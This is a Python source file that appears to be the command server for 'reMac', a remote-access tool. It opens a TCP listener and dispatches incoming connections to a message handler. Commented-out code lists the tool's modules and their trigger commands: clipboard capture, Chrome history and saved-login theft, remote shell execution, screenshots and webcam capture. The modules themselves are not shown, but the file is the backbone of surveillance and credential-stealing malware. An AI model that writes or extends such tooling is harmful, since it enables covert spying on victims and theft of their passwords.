import sys
import socket
import selectors
import traceback
# import libserver
from apps.libs import reMac_libserver

# from modules import mod_hello
# from modules import mod_clipboard
# from modules import mod_chrome_history
# from modules import mod_chrome_logins
# from modules import mod_shellcmd
# from modules import mod_screenshot
# from modules import mod_webcam
#
# reMacModules = {
#     'helloWorld': mod_hello.mod_hello(),
#     'cb': mod_clipboard.mod_clipboard(),
#     'ch': mod_chrome_history.mod_chrome_history(),
#     'cl': mod_chrome_logins.mod_chrome_logins(),
#     'sh': mod_shellcmd.mod_shellcmd(),
#     'sc': mod_screenshot.mod_screenshot(),
#     'wc': mod_webcam.mod_webcam()
# }

conHost = "192.168.0.49"
conPort = "6890"
sel = selectors.DefaultSelector()

class reMac_server():
    def __init__(self):
        self.setup_server()

    def setup_server(self):
        print(f'Server setup successfully!')
        pass

    # def processInput(self, input):
    #     if input == "q":  # or input == "quit":
    #         sys.exit(1)
    #     elif input == "h":  # or input == "help":
    #         # print_help()
    #         pass
    #     elif input == "helloWorld":  # or input == "help":
    #         return reMacModules[input].run_mod()
    #     # elif input == "s":  # or input == "help":
    #     #     myreMac_server.start_server()
    #     # elif input == "c":  # or input == "help":
    #     #     myreMac_client.start_client()
    #     elif input == "cb":  # or input == "clipboard":
    #         reMacModules[input].run_mod()
    #     elif input == "ch":  # or input == "chromeHistory":
    #         reMacModules[input].run_mod()
    #     elif input == "cl":  # or input == "chromeLogins":
    #         reMacModules[input].run_mod()
    #     elif input == "sh":  # or input == "shell":
    #         reMacModules[input].run_mod()
    #     elif input == "sc":  # or input == "screenshot":
    #         reMacModules[input].run_mod()
    #     elif input == "wc":  # or input == "screenshot":
    #         reMacModules[input].run_mod()
    #     elif input == "d" or input == "dev":
    #         reMacModules['sc'].run_mod()
    #     else:
    #         print(f"Command '{input}' NOT FOUND! Check the following command list")
    #         # print_help()

    def accept_connection(self, sock):
        conn, addr = sock.accept()  # Should be ready to read
        print("accepted connection from", addr)
        conn.setblocking(False)
        message = reMac_libserver.Message(sel, conn, addr)
        sel.register(conn, selectors.EVENT_READ, data=message)

    def start_server(self):
        host, port = conHost, int(conPort)
        lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Avoid bind() exception: OSError: [Errno 48] Address already in use
        lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        lsock.bind((host, port))
        lsock.listen()
        print("reMac Server started successfully - Listening on:", (host, port))
        lsock.setblocking(False)
        sel.register(lsock, selectors.EVENT_READ, data=None)

        try:
            while True:
                events = sel.select(timeout=None)
                for key, mask in events:
                    if key.data is None:
                        self.accept_connection(key.fileobj)
                    else:
                        message = key.data
                        try:
                            message.process_events(mask)
                        except Exception:
                            print(
                                "main: error: exception for",
                                f"{message.addr}:\n{traceback.format_exc()}",
                            )
                            message.close()
        except KeyboardInterrupt:
            print("caught keyboard interrupt, exiting")
        finally:
            sel.close()